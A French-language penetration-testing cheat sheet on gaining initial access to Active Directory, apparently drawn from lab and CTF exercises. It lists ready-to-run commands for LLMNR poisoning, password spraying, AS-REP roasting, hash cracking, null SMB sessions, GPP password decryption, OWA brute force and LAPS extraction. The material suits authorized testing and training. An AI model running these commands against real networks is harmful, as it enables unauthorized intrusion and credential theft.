# Obtention d'un Premier Accès

## Empoisonnement LLMNR/NBT-NS

### Depuis Linux (Responder)

```bash
# Lancement de Responder
sudo responder -I eth0 -wfv

# Capture de hashes NetNTLMv2
# Les hashes s'afficheront dans la console et seront stockés dans /usr/share/responder/logs/
```

### Depuis Windows (Inveigh)

```powershell
# Importer le module
Import-Module .\Inveigh.ps1

# Démarrer la capture avec les options de base
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -FileOutput Y

# Version C# executable directement
.\Inveigh.exe
```

### Craquage des hashes NetNTLMv2

```bash
# Avec Hashcat (mode 5600)
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt

# Avec John the Ripper
john --format=netntlmv2 captured_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Password Spraying

### Avec CrackMapExec

```bash
# Spraying contre SMB
crackmapexec smb 172.16.5.5 -u users.txt -p "Password123!" --continue-on-success

# Spraying contre autres services
crackmapexec winrm 172.16.5.5 -u users.txt -p "Password123!" --continue-on-success
crackmapexec ldap 172.16.5.5 -u users.txt -p "Password123!" --continue-on-success
```

### Avec Kerbrute

```bash
# Spray Kerberos pre-auth
./kerbrute_linux_amd64 passwordspray -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 users.txt "Winter2022!"
```

### Protection contre le verrouillage de compte

```bash
# Vérifier la politique de verrouillage
crackmapexec smb 172.16.5.5 -u username -p password --pass-pol

# Vérifier les bad pwd counts
crackmapexec smb 172.16.5.5 -u username -p password --users | grep "badpwdcount"
```

## AS-REP Roasting

### Identification des comptes vulnérables

```bash
# Avec Impacket
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# Avec PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname
```

### Craquage des hashes AS-REP

```bash
# Avec Hashcat (mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```
## Accès anonymes et configurations faibles

### Sessions NULL SMB

```bash
# Tester l'accès null session
smbclient -N -L //172.16.5.5/
rpcclient -U "" -N 172.16.5.5

# Énumération avec enum4linux
enum4linux -a -u "" -p "" 172.16.5.5
```

### Partages anonymes

```bash
# Lister et monter des partages anonymes
smbclient -N //172.16.5.5/SYSVOL
smbclient -N //172.16.5.5/NETLOGON
```

### Extraction d'informations des GPP (Group Policy Preferences)

```bash
# Recherche de fichiers cpassword dans les Group Policies
findstr /S /I cpassword \\172.16.5.5\sysvol\*.xml

# Déchiffrement avec gpp-decrypt
gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
```

## Exploitation d'accès web et portails

### OWA et portails d'entreprise

```bash
# Bruteforce OWA
hydra -L users.txt -P passwords.txt -f 192.168.1.10 https-post-form "/owa/auth.owa:destination=https%3A%2F%2F192.168.1.10%2Fowa&flags=4&forcedownlevel=0&username=^USER^&password=^PASS^&isUtf8=1:Location"
```

## Points importants

- Toujours documenter les credentials obtenus
- Rechercher les modèles/patterns de mots de passe pour de futurs sprays
- Surveiller attentivement les tentatives de connexion pour éviter les verrouillages
- Privilégier les méthodes discrètes (Kerbrute) avant les méthodes bruyantes
- Vérifier d'abord les comptes par défaut et les utilisateurs à faible privilège

## Techniques d'énumération tirées de CTFs réels
#### Énumération LDAP pour mots de passe (Hutch)
Il est parfois possible d'extraire directement des mots de passe LAPS via LDAP:
```bash
ldapsearch -x -H 'ldap://192.168.x.x' -D 'domaine\utilisateur' -w 'MotDePasse' -b 'dc=domaine,dc=tld' "(ms-MCS-AdmPwd=)" ms-MCS-AdmPwd
```

Cette commande recherche spécifiquement l'attribut `ms-MCS-AdmPwd` qui contient les mots de passe LAPS en clair stockés dans Active Directory.
### Fuzzing de sous-domaines (Shibboleth)
Utiliser wfuzz pour découvrir des sous-domaines cachés:
```bash
wfuzz -u http://domaine.tld -H "Host: FUZZ.domaine.tld" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw 26
```
Le paramètre `--hw 26` ignore les réponses ayant exactement 26 mots (utile pour filtrer les réponses "page non trouvée" standard).
### Analyse de métadonnées de fichiers (Intelligence, Reel)

1. Extraire des informations des métadonnées de PDF avec exiftool:
   ```bash
   exiftool document.pdf
   ```
2. Analyser minutieusement les captures d'écran dans les documents - zoomer sur les post-it, moniteurs ou tableaux blancs visibles qui pourraient contenir des identifiants.
3. Vérifier les noms d'utilisateurs dans les propriétés "Auteur" des documents Office.
## Techniques d'attaque Kerberos tirées de CTFs réels
#### Kerberos Pre-Authentication désactivée (Forest, Sauna)
Identifier et exploiter les utilisateurs dont la pré-authentification Kerberos est désactivée:
```bash
# Avec Impacket
GetNPUsers.py domaine.tld/ -dc-ip 10.10.10.x -request -format hashcat

# Avec Kerbrute (alternative)
kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

Les hash obtenus peuvent être crackés avec Hashcat (mode 18200):
```bash
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
Cette technique fonctionne car la pré-authentification désactivée permet d'obtenir un TGT chiffré avec la clé de l'utilisateur (dérivée de son mot de passe), qui peut ensuite être craqué hors ligne.